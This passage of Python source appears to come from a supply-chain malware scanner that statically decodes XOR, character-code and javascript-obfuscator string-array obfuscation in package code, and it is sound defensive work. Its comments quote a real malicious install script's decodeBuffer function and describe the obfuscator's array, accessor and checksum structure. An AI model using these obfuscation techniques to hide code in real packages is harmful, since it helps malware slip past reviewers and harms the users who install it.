    for i, b in enumerate(data):
        if not 0x20 <= b ^ key[i % n] <= 0x7e:
            return False
    return True


def _dv_xor_decoders(view):
    """{name: (kind, key)}: the names `view` calls as XOR decoders (see
    above), in the order of their first calls."""
    calls = {}
    for m in _DV_CALL_RE.finditer(view):
        lits = calls.setdefault(m.group("name"), [])
        if len(lits) < _DV_XOR_MAX_CALLS:
            lits.append(_dv_literal(m))
    out, keys = {}, None
    for name, lits in calls.items():
        if len(lits) < _DV_XOR_MIN_CALLS:
            continue
        kind = "hex" if all(len(x) % 2 == 0 and _DV_HEX_RE.fullmatch(x) for x in lits) else "base64"
        data = [_dv_bytes(x, kind) for x in lits]
        if (sum(d is not None for d in data) < _DV_XOR_MIN_CALLS
                or sum(len(d) for d in data if d is not None) < _DV_XOR_MIN_BYTES):
            continue
        if keys is None:
            keys, seen = [], set()
            for k in _DV_KEY_RE.finditer(view):
                key = k.group("a") or k.group("b") or k.group("c")
                if key not in seen and all(" " <= ch <= "~" for ch in key):
                    seen.add(key)
                    keys.append(key.encode("ascii"))
                    if len(keys) >= _DV_XOR_MAX_KEYS:
                        break
        allowed = len(lits) // 10                   # calls that may stay unread
        for key in keys:
            bad = 0
            for d in data:
                if d is None or not _dv_xor_printable(d, key):
                    bad += 1
                    if bad > allowed:
                        break
            if bad <= allowed:
                out[name] = (kind, key)
                break
        if len(out) >= _DV_MAX_HELPERS:
            break
    return out


def _dv_xor_sub(xors):
    """re.sub's function: a call of an XOR decoder read as its text, when
    that is printable ASCII."""
    def sub(m):
        kind, key = xors[m.group("name")]
        d = _dv_bytes(_dv_literal(m), kind)
        if d is None or not _dv_xor_printable(d, key):
            return m.group()
        return _dv_quote(bytes(b ^ key[i % len(key)] for i, b in enumerate(d)).decode("ascii"))
    return sub


# (0.1.8) Character codes. Text a file keeps as numbers is read as the text
# it is: String.fromCharCode(…) of integer literals (also `...[…]` and
# `.apply(null, […])`), Python's ''.join(map(chr, […])), ''.join(chr(c) for c
# in […]) and bytes([…]).decode(…). And text a function of the file computes
# from character codes, position by position, whatever its key: @fnos/app's
# install script started the file
#     path.join(__dirname, decodeBuffer(_workerDir, 7), decodeBuffer(_workerFile, 3))
# with every string of its runner kept as an array of codes and decoded by
#     function decodeBuffer(buffer, bias) {
#       var assembled = '';
#       for (var pos = 0; pos < buffer.length; pos++)
#         assembled += String.fromCharCode(buffer[pos] ^ ((pos + bias) * 13 + 7 & 0xff));
#       return assembled;
#     }
# — no key is written as a string, so there is none to try (the XOR decoder
# above): the function's own arithmetic is the key. Such a decoder is a
# function (function f(…) {, f = function (…) {, f = (…) =>, def f(…):) of
# one to _DV_CC_MAX_PARAMS plain parameters whose first _DV_CC_BODY
# characters hold a transform — String.fromCharCode(E) or chr(E) of one
# expression, or String.fromCharCode(...d.map((c, i) => E)) — and a walk over
# the parameter it decodes: for (var|let i = 0; i < d.length; …), d.map((c,
# i) => …) or d.split('').map(…), and in Python for i in range(len(d)), for c
# in d or for i, c in enumerate(d) (a statement, a comprehension or a
# generator). E is arithmetic — integers, + - * % & | ^ << >> >>> ~ and
# parentheses — over the walk's position and element (d[i], c,
# d.charCodeAt(i), c.charCodeAt(0), ord(c)) and the other parameters (a
# number, or a string read with k.charCodeAt(…), ord(k[…]), k.length or
# len(k)). A call of it whose arguments are literals — integers, arrays of
# integers (or a name assigned one once and never changed), strings of
# printable ASCII — is worked out by a small evaluator of that arithmetic
# (nothing is run) and read as its text when all of it is printable ASCII.
# Every value stays a 32-bit integer or the call is not read (% and >>> of
# non-negative numbers, shifts by 0 to 31), so the arithmetic is the one both
# languages do. Bounds: _DV_CC_MAX_DECODERS decoders, the first
# _DV_CC_MAX_CALLS calls, _DV_CC_MAX_CODES codes an argument and
# _DV_CC_MAX_WORK codes worked out per text; a transform of at most
# _DV_CC_MAX_TOKENS tokens, _DV_CC_MAX_DEPTH deep.
_DV_CC_BODY = 600
_DV_CC_MAX_PARAMS = 4
_DV_CC_MAX_DECODERS = 8
_DV_CC_MAX_CALLS = 256
_DV_CC_MAX_CODES = 4096
_DV_CC_MAX_WORK = 50_000
_DV_CC_MAX_TOKENS = 64
_DV_CC_MAX_DEPTH = 16
_DV_CC_INT_MAX = 2147483647
_DV_CC_INT = r"(?:0[xX][0-9a-fA-F]{1,8}|[0-9]{1,10})"
_DV_CC_INTS = _DV_CC_INT + r"(?:[ \t]*,[ \t]*" + _DV_CC_INT + r"){0,399}[ \t]*,?"
_DV_CC_LITERAL_SRC = (
    r"""\bString[ \t]*\.[ \t]*fromCharCode[ \t]*(?:\([ \t]*(?:\.\.\.[ \t]*\[[ \t]*(?P<a>""" + _DV_CC_INTS
    + r""")[ \t]*\]|(?P<b>""" + _DV_CC_INTS + r"""))[ \t]*\)|\.[ \t]*apply[ \t]*\([ \t]*(?:null|undefined|this|String)"""
    r"""[ \t]*,[ \t]*\[[ \t]*(?P<c>""" + _DV_CC_INTS + r""")[ \t]*\][ \t]*\))"""
    r"""|(?:''|"")[ \t]*\.[ \t]*join[ \t]*\([ \t]*(?:map[ \t]*\([ \t]*chr[ \t]*,[ \t]*[\[(][ \t]*(?P<d>"""
    + _DV_CC_INTS + r""")[ \t]*[\])][ \t]*\)|\[?[ \t]*chr[ \t]*\([ \t]*(?P<v>[A-Za-z_]\w*)[ \t]*\)[ \t]+for[ \t]+\5"""
    r"""[ \t]+in[ \t]+[\[(][ \t]*(?P<e>""" + _DV_CC_INTS + r""")[ \t]*[\])][ \t]*\]?)[ \t]*\)"""
    r"""|\bbyte(?:s|array)[ \t]*\([ \t]*[\[(][ \t]*(?P<f>""" + _DV_CC_INTS + r""")[ \t]*[\])][ \t]*\)[ \t]*\.[ \t]*decode"""
    r"""[ \t]*\([^()\n]{0,20}\)""")
_DV_CC_FUNC_SRC = (
    r"""\bfunction[ \t]+(?P<a>[A-Za-z_$][\w$]*)[ \t]*\((?P<pa>[^()\n]{0,120})\)[ \t]*\{"""
    r"""|\b(?:const|let|var)[ \t]+(?P<b>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*(?:function\b[ \t]*(?:[A-Za-z_$][\w$]*)?[ \t]*"""
    r"""\((?P<pb>[^()\n]{0,120})\)[ \t]*\{|\((?P<pc>[^()\n]{0,120})\)[ \t]*=>)"""
    r"""|\bdef[ \t]+(?P<c>[A-Za-z_]\w*)[ \t]*\((?P<pd>[^()\n]{0,120})\)[ \t]*(?:->[^:\n]{0,80})?:""")
_DV_CC_SITE_SRC = r"""\bString[ \t]*\.[ \t]*fromCharCode[ \t]*\(|(?<![\w$.])chr[ \t]*\("""
_DV_CC_FOR_SRC = (r"""\bfor[ \t]*\([ \t]*(?:var|let)[ \t]+(?P<i>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*0[ \t]*;[ \t]*\1[ \t]*<"""
                  r"""[ \t]*(?P<d>[A-Za-z_$][\w$]*)[ \t]*\.[ \t]*length[ \t]*;""")
_DV_CC_MAP_SRC = (r"""(?<![\w$.])(?P<d>[A-Za-z_$][\w$]*)[ \t]*(?P<split>\.[ \t]*split[ \t]*\([ \t]*(?:''|"")[ \t]*\)"""
                  r"""[ \t]*)?\.[ \t]*map[ \t]*\([ \t]*(?:function\b[ \t]*(?:[A-Za-z_$][\w$]*)?[ \t]*\([ \t]*"""
                  r"""(?P<e>[A-Za-z_$][\w$]*)(?:[ \t]*,[ \t]*(?P<i>[A-Za-z_$][\w$]*))?[ \t]*\)[ \t]*\{"""
                  r"""|\([ \t]*(?P<e2>[A-Za-z_$][\w$]*)(?:[ \t]*,[ \t]*(?P<i2>[A-Za-z_$][\w$]*))?[ \t]*\)[ \t]*=>"""
                  r"""|(?P<e3>[A-Za-z_$][\w$]*)[ \t]*=>)""")
_DV_CC_PYFOR_SRC = (r"""\bfor[ \t]+(?P<i>[A-Za-z_]\w*)[ \t]+in[ \t]+range[ \t]*\([ \t]*len[ \t]*\([ \t]*"""
                    r"""(?P<d>[A-Za-z_]\w*)[ \t]*\)[ \t]*\)""")
_DV_CC_PYITER_SRC = (r"""\bfor[ \t]+(?:(?P<i>[A-Za-z_]\w*)[ \t]*,[ \t]*(?P<e>[A-Za-z_]\w*)[ \t]+in[ \t]+enumerate[ \t]*"""
                     r"""\([ \t]*(?P<d>[A-Za-z_]\w*)[ \t]*\)|(?P<e2>[A-Za-z_]\w*)[ \t]+in[ \t]+(?P<d2>[A-Za-z_]\w*)"""
                     r"""(?![\w$.(\[]))""")
_DV_CC_TOKEN_SRC = r"""[ \t]*(?:(?P<num>0[xX][0-9a-fA-F]{1,8}|[0-9]{1,10})|(?P<name>[A-Za-z_$][\w$]*)|(?P<op>>>>|<<|>>|[-+*%&|^~()\[\].,]))"""
_DV_CC_ARG_INT_SRC = r"""-?""" + _DV_CC_INT
_DV_CC_ARG_STR_SRC = r"""'(?P<a>[ -&(-\[\]-~]{0,400})'|"(?P<b>[ !#-\[\]-~]{0,400})\""""
_DV_CC_CALL_TAIL = r"""[ \t]*\((?P<args>(?:[^()'"\n]|'[^'\\\n]{0,400}'|"[^"\\\n]{0,400}"){0,20000})\)"""
# a name assigned an array of integers (the name escaped before it)
_DV_CC_ARRAY_TAIL = (r"""[ \t]*=[ \t]*[\[(]\s*(?P<items>""" + _DV_CC_INT + r"""(?:\s*,\s*""" + _DV_CC_INT
                     + r"""){0,4095}\s*,?)\s*[\])]""")
_DV_CC_LITERAL_RE = re.compile(_DV_CC_LITERAL_SRC)
_DV_CC_FUNC_RE = re.compile(_DV_CC_FUNC_SRC)
_DV_CC_SITE_RE = re.compile(_DV_CC_SITE_SRC)
_DV_CC_FOR_RE = re.compile(_DV_CC_FOR_SRC)
_DV_CC_MAP_RE = re.compile(_DV_CC_MAP_SRC)
_DV_CC_PYFOR_RE = re.compile(_DV_CC_PYFOR_SRC)
_DV_CC_PYITER_RE = re.compile(_DV_CC_PYITER_SRC)
_DV_CC_TOKEN_RE = re.compile(_DV_CC_TOKEN_SRC)
_DV_CC_ARG_INT_RE = re.compile(_DV_CC_ARG_INT_SRC)
_DV_CC_ARG_STR_RE = re.compile(_DV_CC_ARG_STR_SRC)
_DV_CC_NAME_RE = re.compile(r"""[A-Za-z_$][\w$]*""")
_DV_CC_INT_RE = re.compile(_DV_CC_INT)
_DV_CC_BINARY = {"|": 1, "^": 2, "&": 3, "<<": 4, ">>": 4, ">>>": 4, "+": 5, "-": 5, "*": 6, "%": 6}


class _CcFail(Exception):
    """A decoder's arithmetic, or a call's arguments, left what the evaluator reads."""


def _cc_int_literal(s):
    """The value of an integer literal (decimal or 0x…), at most
    _DV_CC_INT_MAX; else _CcFail."""
    if _DV_CC_INT_RE.fullmatch(s) is None:
        raise _CcFail
    v = int(s[2:], 16) if s[:2] in ("0x", "0X") else int(s)
    if v > _DV_CC_INT_MAX:
        raise _CcFail
    return v


def _cc_ints(items):
    """The integers of a comma-separated list (a trailing comma allowed)."""
    parts = [p.strip() for p in items.split(",")]
    if parts and parts[-1] == "":
        parts.pop()
    return [_cc_int_literal(p) for p in parts]


def _cc_parse(expr):
    """The syntax tree of a transform (see above), else None: ('n', int),
    ('v', name), ('u', op, e), ('b', op, l, r), ('i', e, e) (an index),
    ('c', e, e) (.charCodeAt), ('l', e) (.length, len), ('o', e) (ord)."""
    toks, pos, n = [], 0, len(expr)
    while pos < n:
        m = _DV_CC_TOKEN_RE.match(expr, pos)
        if m is None:
            if expr[pos:].strip(" \t"):
                return None
            break
        if m.group("num") is not None:
            toks.append(("n", m.group("num")))
        elif m.group("name") is not None:
            toks.append(("v", m.group("name")))
        else:
            toks.append(("o", m.group("op")))
        pos = m.end()
        if len(toks) > _DV_CC_MAX_TOKENS:
            return None
    at = [0]

    def peek(value=None):
        if at[0] >= len(toks):
            return None
        tok = toks[at[0]]
        return tok if value is None or (tok[0] == "o" and tok[1] == value) else None

    def take(value):
        if peek(value) is None:
            raise _CcFail
        at[0] += 1

    def expression(min_prec, depth):
        if depth > _DV_CC_MAX_DEPTH:
            raise _CcFail
        left = unary(depth)
        while True:
            tok = peek()
            if tok is None or tok[0] != "o" or tok[1] not in _DV_CC_BINARY or _DV_CC_BINARY[tok[1]] < min_prec:
                return left
            at[0] += 1
            left = ("b", tok[1], left, expression(_DV_CC_BINARY[tok[1]] + 1, depth + 1))

    def unary(depth):
        tok = peek()
        if tok is not None and tok[0] == "o" and tok[1] in ("-", "~", "+"):
            if depth >= _DV_CC_MAX_DEPTH:
                raise _CcFail
            at[0] += 1
            return ("u", tok[1], unary(depth + 1))
        return postfix(depth)

    def postfix(depth):
        node = primary(depth)
        while True:
            if peek("[") is not None:
                at[0] += 1
                node = ("i", node, expression(1, depth + 1))
                take("]")
            elif peek(".") is not None:
                at[0] += 1
                tok = peek()
                if tok is None or tok[0] != "v" or tok[1] not in ("charCodeAt", "length"):
                    raise _CcFail
                at[0] += 1
                if tok[1] == "length":
                    node = ("l", node)
                else:
                    take("(")
                    node = ("c", node, ("n", 0) if peek(")") is not None else expression(1, depth + 1))
                    take(")")
            else:
                return node

    def primary(depth):
        tok = peek()
        if tok is None:
            raise _CcFail
        at[0] += 1
        if tok[0] == "n":
            return ("n", _cc_int_literal(tok[1]))
        if tok[0] == "v":
            if tok[1] in ("ord", "len") and peek("(") is not None:
                at[0] += 1
                arg = expression(1, depth + 1)
                take(")")
                return ("o" if tok[1] == "ord" else "l", arg)
            return ("v", tok[1])
        if tok[1] == "(":
            inner = expression(1, depth + 1)
            take(")")
            return inner
        raise _CcFail

    try:
        tree = expression(1, 0)
    except _CcFail:
        return None
    return tree if at[0] == len(toks) else None


def _cc_names(tree, out):
    """The names a transform reads (`out`, a set), returned."""
    if tree[0] == "v":
        out.add(tree[1])
    elif tree[0] in ("u",):
        _cc_names(tree[2], out)
    elif tree[0] == "b":
        _cc_names(tree[2], out)
        _cc_names(tree[3], out)
    elif tree[0] in ("i", "c"):
        _cc_names(tree[1], out)
        _cc_names(tree[2], out)
    elif tree[0] in ("l", "o"):
        _cc_names(tree[1], out)
    return out


def _cc_check(v):
    if not -_DV_CC_INT_MAX - 1 <= v <= _DV_CC_INT_MAX:
        raise _CcFail
    return v


def _cc_num(v):
    if type(v) is not int:
        raise _CcFail
    return v


def _cc_compile(tree):
    """A function of the names' values that works a transform out (see above):
    an integer, or _CcFail."""
    kind = tree[0]
    if kind == "n":
        value = tree[1]
        return lambda env: value
    if kind == "v":
        name = tree[1]

        def var(env):
            if name not in env:
                raise _CcFail
            return env[name]
        return var
    if kind == "u":
        op, arg = tree[1], _cc_compile(tree[2])
        if op == "-":
            return lambda env: _cc_check(-_cc_num(arg(env)))
        if op == "~":
            return lambda env: ~_cc_num(arg(env))
        return lambda env: _cc_num(arg(env))
    if kind == "b":
        op, left, right = tree[1], _cc_compile(tree[2]), _cc_compile(tree[3])

        def binary(env):
            a, b = _cc_num(left(env)), _cc_num(right(env))
            if op == "+":
                return _cc_check(a + b)
            if op == "-":
                return _cc_check(a - b)
            if op == "*":
                return _cc_check(a * b)
            if op == "%":
                if a < 0 or b <= 0:
                    raise _CcFail
                return a % b
            if op == "&":
                return a & b
            if op == "|":
                return a | b
            if op == "^":
                return a ^ b
            if not 0 <= b <= 31:
                raise _CcFail
            if op == "<<":
                return _cc_check(a << b)
            if op == ">>>" and a < 0:
                raise _CcFail
            return a >> b
        return binary
    if kind in ("i", "c"):
        obj, index = _cc_compile(tree[1]), _cc_compile(tree[2])
        chars = kind == "c"

        def item(env):
            seq, k = obj(env), _cc_num(index(env))
            if chars and type(seq) is not str or not chars and type(seq) not in (list, str):
                raise _CcFail
            if not 0 <= k < len(seq):
                raise _CcFail
            return ord(seq[k]) if chars else seq[k]
        return item
    if kind == "l":
        obj = _cc_compile(tree[1])

        def length(env):
            seq = obj(env)
            if type(seq) not in (list, str):
                raise _CcFail
            return len(seq)
        return length
    arg = _cc_compile(tree[1])                              # "o": ord

    def code(env):
        ch = arg(env)
        if type(ch) is not str or len(ch) != 1:
            raise _CcFail
        return ord(ch)
    return code


def _cc_balanced(text, i, limit):
    """text[i:j] up to the ')' that closes the call opened just before i, and
    j, else None (a quote-aware pass over at most `limit` characters)."""
    depth, j, end, quote = 0, i, min(len(text), i + limit), None
    while j < end:
        ch = text[j]
        if quote is not None:
            if ch == "\\":
                j += 2
                continue
            if ch == quote:
                quote = None
        elif ch in "'\"`":
            quote = ch
        elif ch in "([{":
            depth += 1
        elif ch in ")]}":
            if depth == 0:
                return (text[i:j], j) if ch == ")" else None
            depth -= 1
        j += 1
    return None


def _cc_params(s):
    """The plain parameter names of a parameter list, else None."""
    names = [p.strip() for p in s.split(",")] if s.strip() else []
    if not 1 <= len(names) <= _DV_CC_MAX_PARAMS or any(not _DV_CC_NAME_RE.fullmatch(p) for p in names):
        return None
    return names if len(set(names)) == len(names) else None


def _cc_walks(body):
    """[(offset, data, element, index, split, js_map)]: the walks over a
    parameter a decoder's body holds (see above), in their order."""
    out = []
    for m in _DV_CC_FOR_RE.finditer(body):
        out.append((m.start(), m.group("d"), None, m.group("i"), False, False))
    for m in _DV_CC_MAP_RE.finditer(body):
        out.append((m.start(), m.group("d"), m.group("e") or m.group("e2") or m.group("e3"),
                    m.group("i") or m.group("i2"), m.group("split") is not None, True))
    for m in _DV_CC_PYFOR_RE.finditer(body):
        out.append((m.start(), m.group("d"), None, m.group("i"), False, False))
    for m in _DV_CC_PYITER_RE.finditer(body):
        out.append((m.start(), m.group("d") or m.group("d2"), m.group("e") or m.group("e2"), m.group("i"),
                    False, False))
    out.sort(key=lambda w: w[0])
    return out


def _cc_decoders(view):
    """{name: decoder} for the file's own character-code decoders (see above),
    in the order of their transforms; a decoder is (params, data index,
    element, index, split, js_map, compiled transform)."""
    out, heads, ends = {}, None, None
    for site in _DV_CC_SITE_RE.finditer(view):
        if heads is None:
            heads = list(_DV_CC_FUNC_RE.finditer(view))
            ends = [h.end() for h in heads]
        k = bisect.bisect_right(ends, site.start()) - 1     # the last function header before the transform
        if k < 0 or site.start() >= ends[k] + _DV_CC_BODY:
            continue
        head = heads[k]
        name = head.group("a") or head.group("b") or head.group("c")
        params = _cc_params(next(p for p in (head.group("pa"), head.group("pb"), head.group("pc"), head.group("pd"))
                                 if p is not None))
        if name in out or params is None:
            continue
        got = _cc_balanced(view, site.end(), _DV_CC_BODY)
        if got is None:
            continue
        arg = got[0].strip()
        body = view[head.end():head.end() + _DV_CC_BODY]
        if arg.startswith("..."):
            spread = arg[3:].lstrip(" \t")
            m = _DV_CC_MAP_RE.match(spread)
            if m is None or m.group("e") is not None or not spread.endswith(")"):
                continue
            walks = [(0, m.group("d"), m.group("e2") or m.group("e3"), m.group("i2"), m.group("split") is not None,
                      True)]
            expr = spread[m.end():-1]
        else:
            walks, expr = _cc_walks(body), arg
        tree = _cc_parse(expr)
        if tree is None:
            continue
        names = _cc_names(tree, set())
        for _at, data, elem, index, split, js_map in walks:
            bound = {v for v in (elem, index) if v}
            if (data not in params or not bound & names or bound & set(params)
                    or not names <= set(params) | bound):
                continue
            out[name] = (params, params.index(data), elem, index, split, js_map, _cc_compile(tree))
            break
        if len(out) >= _DV_CC_MAX_DECODERS:
            break
    return out


def _cc_argument(s, view, arrays):
    """A call's literal argument: an integer, a list of integers (written, or
    a name assigned one once and never changed), a string of printable
    ASCII; else _CcFail."""
    s = s.strip()
    if _DV_CC_ARG_INT_RE.fullmatch(s):
        return -_cc_int_literal(s[1:]) if s.startswith("-") else _cc_int_literal(s)
    if len(s) >= 2 and s[0] in "[(" and s[-1] in "])":
        if s[1:-1].strip() == "":
            raise _CcFail
        return _cc_ints(s[1:-1])
    m = _DV_CC_ARG_STR_RE.fullmatch(s)
    if m is not None:
        return m.group("a") if m.group("a") is not None else m.group("b")
    if _DV_CC_NAME_RE.fullmatch(s):
        if s not in arrays:
            esc = re.escape(s)
            a = re.search(_DV_NAME_HEAD + esc + _DV_CC_ARRAY_TAIL, view)
            arrays[s] = (None if a is None or re.search(_DV_NAME_HEAD + esc + _DV_MUTATED_TAIL, view)
                         or len(re.findall(_DV_NAME_HEAD + esc + _DV_ASSIGNED_TAIL, view)) != 1
                         else _cc_ints(a.group("items")))
        if arrays[s] is not None:
            return arrays[s]
    raise _CcFail


def _cc_run(decoder, args, work):
    """The text a decoder gives for a call's arguments (see above), else
    _CcFail; `work` ([codes left]) is spent."""
    params, data_at, elem, index, split, js_map, fn = decoder
    if len(args) < len(params):
        raise _CcFail
    data = args[data_at]
    if type(data) not in (list, str) or (js_map and (type(data) is str) != split) or not data:
        raise _CcFail
    if len(data) > _DV_CC_MAX_CODES or len(data) > work[0]:
        raise _CcFail
    work[0] -= len(data)
    env = dict(zip(params, args))
    out = []
    for k, item in enumerate(data):
        if index:
            env[index] = k
        if elem:
            env[elem] = item
        c = fn(env)
        if type(c) is not int or not 0x20 <= c <= 0x7e:
            raise _CcFail
        out.append(chr(c))
    return "".join(out)


def _cc_split_args(s):
    """A call's arguments split at their top-level commas (not in brackets
    or quotes)."""
    parts, depth, start, quote = [], 0, 0, None
    for k, ch in enumerate(s):
        if quote is not None:
            if ch == quote:
                quote = None
        elif ch in "'\"":
            quote = ch
        elif ch in "[(":
            depth += 1
        elif ch in "])":
            depth -= 1
        elif ch == "," and depth == 0:
            parts.append(s[start:k])
            start = k + 1
    parts.append(s[start:])
    return parts


def _cc_literal_sub(m):
    """re.sub's function: literal character codes read as their text, when
    it is printable ASCII."""
    items = next(g for g in (m.group("a"), m.group("b"), m.group("c"), m.group("d"), m.group("e"), m.group("f"))
                 if g is not None)
    try:
        codes = _cc_ints(items)
    except _CcFail:
        return m.group()
    if not codes or any(not 0x20 <= c <= 0x7e for c in codes):
        return m.group()
    return _dv_quote("".join(map(chr, codes)))


def _dv_char_codes(view):
    """`view` with the character codes it holds and the calls of its own
    character-code decoders read as their text (see above)."""
    view = _DV_CC_LITERAL_RE.sub(_cc_literal_sub, view)
    decoders = _cc_decoders(view)
    if not decoders:
        return view
    call = re.compile(_DV_NAME_HEAD + "(?P<name>" + "|".join(re.escape(n) for n in sorted(decoders))
                      + ")" + _DV_CC_CALL_TAIL)
    arrays, work, calls = {}, [_DV_CC_MAX_WORK], [0]

    def sub(m):
        if calls[0] >= _DV_CC_MAX_CALLS:
            return m.group()
        calls[0] += 1
        try:
            args = [_cc_argument(a, view, arrays) for a in _cc_split_args(m.group("args"))]
            return _dv_quote(_cc_run(decoders[m.group("name")], args, work))
        except _CcFail:
            return m.group()
    return call.sub(sub, view)


# (0.1.8) String arrays. javascript-obfuscator, and the obfuscators that
# copy it, move every string of a file into one array and read each back
# through a function; SC-OBF-IDENT saw only the tool's `_0x` names, not
# what the code does (the @antv compromises, the 2026 setup.mjs payloads,
# the benchmark's obfuscated installers and stealers). The shape is the
# technique, whatever the names:
#     function A(){const a=['…', …];A=function(){return a;};return A();}
#     function G(i,k){i=i-OFFSET;const a=A();let s=a[i];… s decoded …;return s;}
#     (function(f,T){const g=G,a=f();while(!![]){try{const v=-parseInt(g(0x1a))/1+…;
#         if(v===T)break;else a['push'](a['shift']());}catch(e){a['push'](a['shift']());}}}(A,0x3f1c2));
# (or G reading A() once and replacing itself: `return G=function(i,k){…}`),
# called as G(0x1a4) directly, through aliases (`const g=G`), through
# wrapper functions (`function w(a,b,c){return G(c- -0x2e,a);}`), with an
# index written as arithmetic or kept in an object of constants
# (`{_0x1:0x1a4}`). It is read without running anything: the strings; the
# accessor's offset and decoding — none, its base64 over the alphabet the
# accessor holds, or RC4 over that base64 with the key a call passes; and
# the rotation the checksum loop applies — the one for which the loop's
# JavaScript arithmetic (doubles, parseInt, strings read as numbers) gives
# its target, with the decoding that gives it. Nothing is read unless the
# checksum holds (a file without a checksum loop: unrotated). Each call of
# the accessor, an alias or a wrapper whose arguments are constants then
# reads as the string it returns (on its row: a string that holds a line
# break is written with an escape). A decoded string past U+FFFF or with a
# lone surrogate is not read (JavaScript and Python count those
# differently). At most _SA_MAX_ARRAYS arrays a file, _SA_MAX_ITEMS
# strings each, _SA_MAX_CALLS calls read; a text of more than _SA_MAX_CHARS
# is not read.
# (the detection round) The technique is a sign of its own: install-time code
# (a hook's script, the scripts it starts) and import-time code built
# around a string array — one whose calls are read as above — says so
# (string_array_line), CRITICAL however little of what it decodes the
# other tests understand (an obfuscated payload often runs what they miss:
# a wrapper that downloads, a native addon it starts). No benign package of
# the benchmark, and none of the ~60,000 files of popular packages read for
# it, ships code built that way.
_SA_TECHNIQUE_REASON = "hides its code in a string array it decodes as it runs (an obfuscator's technique)"
_SA_MAX_CHARS = 16_000_000
_SA_MAX_ARRAYS = 4
_SA_MAX_ITEMS = 200_000
_SA_MAX_CALLS = 1_000_000
_SA_DEPTH = 8                   # aliases and wrappers followed to the accessor, at most
_SA_BODY = 3000                 # characters of an accessor read for its alphabet
_SA_LOOP_BACK = 20000           # characters before the checksum call its loop may start
_SA_HEX_MAX = 13                # hex digits read as a number (more: NaN, as for _SA_DEC_MAX)
_SA_DEC_MAX = 15                # decimal digits parseInt reads (more: NaN)
_SA_IDENT = r"[A-Za-z_$][\w$]*"
_SA_ARRAY_FN_RE = re.compile(r"function\s+(?P<fn>" + _SA_IDENT + r")\s*\(\s*\)\s*\{\s*(?:var|const|let)\s+(?P<arr>"
                             + _SA_IDENT + r")\s*=\s*\[")
_SA_LIT_RE = re.compile(r"""'(?:[^'\\\n]|\\[^\n])*'|"(?:[^"\\\n]|\\[^\n])*""" + '"')
_SA_SPACE_RE = re.compile(r"\s*")
_SA_OCT_RE = re.compile(r"[0-3][0-7]{0,2}|[4-7][0-7]?")
# (the array function's end, the accessor's two forms and the checksum call:
# with the array function's name, escaped, between the head and the tail)
_SA_TAIL_HEAD = r"\s*;?\s*"
_SA_TAIL_MID = r"\s*=\s*function\s*\(\s*\)\s*\{\s*return\s+"
_SA_TAIL_END = r"\s*;?\s*\}\s*;?\s*return\s+"
_SA_TAIL_CALL = r"\s*\(\s*\)\s*;?\s*\}"
_SA_OFF = r"(?P<off>[^;{}]{1,300})"
_SA_ACC_A_HEAD = (r"function\s+(?P<g>" + _SA_IDENT + r")\s*\(\s*(?P<p>" + _SA_IDENT + r")\s*,\s*" + _SA_IDENT
                  + r"\s*\)\s*\{\s*(?P=p)\s*=\s*(?P=p)\s*-\s*" + _SA_OFF + r";\s*(?:var|const|let)\s+" + _SA_IDENT
                  + r"\s*=\s*")
_SA_ACC_B_HEAD = (r"function\s+(?P<g>" + _SA_IDENT + r")\s*\(\s*" + _SA_IDENT + r"\s*,\s*" + _SA_IDENT
                  + r"\s*\)\s*\{\s*(?:var|const|let)\s+" + _SA_IDENT + r"\s*=\s*")
_SA_ACC_B_TAIL = (r"\s*\(\s*\)\s*;\s*return\s+(?P=g)\s*=\s*function\s*\(\s*(?P<p>" + _SA_IDENT + r")\s*,\s*"
                  + _SA_IDENT + r"\s*\)\s*\{\s*(?P=p)\s*=\s*(?P=p)\s*-\s*" + _SA_OFF + r";")
_SA_CALL_TAIL = r"\s*\(\s*\)"
_SA_INVOKE_HEAD = r"\}\s*\(\s*"
_SA_INVOKE_TAIL = r"\s*,\s*(?P<t>(?:[^;()]|\([^;()]*\)){1,200}?)\)\s*\)"
_SA_INVOKE2_HEAD = r"\}\s*\)\s*\(\s*"
_SA_INVOKE2_TAIL = r"\s*,\s*(?P<t>(?:[^;()]|\([^;()]*\)){1,200}?)\)"
_SA_CHECKSUM_RE = re.compile(r"try\s*\{\s*(?:var|const|let)\s+(?P<v>" + _SA_IDENT + r")\s*=\s*(?P<e>[^;]{1,6000});\s*"
                             r"if\s*\(\s*(?P=v)\s*===\s*" + _SA_IDENT + r"\s*\)\s*break")
_SA_ALPHABET_RE = re.compile(r"""['"]([A-Za-z0-9+/=]{65})['"]""")
_SA_ALIAS_RE = re.compile(r"(?<![\w$.])(" + _SA_IDENT + r")\s*=\s*(" + _SA_IDENT + r")\s*(?=[,;)\n}])")
_SA_WRAPPER_RE = re.compile(r"(?:\bfunction\s+(?P<n1>" + _SA_IDENT + r")|(?<![\w$.])(?P<n2>" + _SA_IDENT
                            + r")\s*=\s*function(?:\s+" + _SA_IDENT + r")?)\s*\((?P<params>[^()]{0,400})\)\s*\{\s*"
                            r"return\s+(?P<target>" + _SA_IDENT + r")\s*\((?P<args>[^()]{0,400})\)\s*;?\s*\}")
_SA_PARAM_RE = re.compile(r"\s*(" + _SA_IDENT + r")\s*")
_SA_OBJECT_RE = re.compile(r"(?<![\w$.])(" + _SA_IDENT + r")\s*=\s*\{")
_SA_ENTRY_RE = re.compile(r"""\s*(?:(?P<k>""" + _SA_IDENT + r""")|'(?P<k2>[^'\\\n]*)'|"(?P<k3>[^"\\\n]*)")\s*:\s*"""
                          r"""(?P<v>-?\s*(?:0[xX][0-9a-fA-F]+|(?:0|[1-9]\d*)(?:\.\d+)?)|'(?:[^'\\\n]|\\[^\n])*'"""
                          r"""|"(?:[^"\\\n]|\\[^\n])*")\s*(?P<end>[,}])""")
_SA_TOKEN_RE = re.compile(r"""\s*(?:(?P<num>0[xX][0-9a-fA-F]+|(?:0|[1-9]\d*)(?:\.\d*)?(?:[eE][-+]?\d+)?|\.\d+(?:[eE][-+]?\d+)?)"""
                          r"""(?![\w$])|(?P<str>'(?:[^'\\\n]|\\[^\n])*'|"(?:[^"\\\n]|\\[^\n])*")|(?P<name>"""
                          + _SA_IDENT + r""")|(?P<op>[-+*/()\[\].,]))""")
# a call's arguments: characters, string literals and parenthesized groups of them
_SA_ARG_UNIT = r"""[^()'"\n]|'(?:[^'\\\n]|\\[^\n])*'|"(?:[^"\\\n]|\\[^\n])*""" + '"'
_SA_CALL_RE = re.compile(r"(?<![\w$.])(" + _SA_IDENT + r")\s*\(((?:" + _SA_ARG_UNIT + r"|\((?:" + _SA_ARG_UNIT
